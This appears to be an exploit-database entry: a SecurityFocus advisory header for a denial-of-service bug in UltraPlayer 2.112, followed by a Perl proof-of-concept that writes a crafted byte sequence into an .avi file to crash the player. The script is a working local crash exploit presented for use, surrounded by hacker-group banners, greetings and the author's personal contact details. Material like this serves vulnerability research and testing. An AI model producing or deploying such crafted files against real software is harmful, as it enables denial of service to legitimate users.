@@ -1,0 +1,70 @@
+source: http://www.securityfocus.com/bid/51652/info
+
+UltraPlayer is prone to a denial-of-service vulnerability.
+
+Attackers can exploit this issue to crash the affected application, denying service to legitimate users.
+
+UltraPlayer 2.112 is vulnerable; other versions may also be affected. 
+
+#!/usr/bin/perl
+sub logo {
+print STDERR << "EOF";
+                                                                   
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm KedAns-Dz member from Inj3ct0r Team                1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+EOF
+}
+####
+# Title : UltraPlayer v2.112 (.avi) Local Crash p0c Exploit
+# Author : KedAns-Dz
+# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
+# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
+# Web Site : www.1337day.com
+# Facebook : http://facebook.com/KedAns 
+# platform : windows ( Dos/p0c )
+# Type : local exploit / p0c 4 Crash !!
+#####
+
+##
+# | >> --------+++=[ Dz Offenders Cr3w ]=+++-------- << |
+# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3   |
+# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * Dr.55h |
+# | KinG Of PiraTeS * The g0bl!n * soucha * dr.R!dE  .. |
+# | ------------------------------------------------- < |
+###
+
+logo();
+sleep(2);
+my $PoC = "\x4D\x41\x43\x20\x96\x0f\x00\x00\x34\x00\x00\x00\x18\x00\x00\x00";
+open (FILE,">> KedAns.avi"); # Bad File Here
+print FILE $PoC;
+close (FILE);
+
+# sP^tHanX & Gr33tZ t0 : Omar (www.l3b-r1z.com) | And My fr!ndS 0n HMD ^___^ <3 <3
+
+#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]=====================================
+# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > || Rizky Ariestiyansyah * Islam Caddy 
+# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re * CrosS (www.1337day.com) 
+# Inj3ct0r Members 31337 : Indoushka * KnocKout * Kalashinkov3 * SeeMe * ZoRLu * anT!-Tr0J4n
+# Anjel Injection (www.1337day.com/team) * Dz Offenders Cr3w * Algerian Cyber Army * Sec4ever
+# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X
+# Kha&miX * Str0ke * JF * Ev!LsCr!pT_Dz * KinG Of PiraTeS * www.packetstormsecurity.org * TreX
+# www.metasploit.com * UE-Team & I-BackTrack * r00tw0rm.com * All Security and Exploits Webs ..
+#=================================================================================================
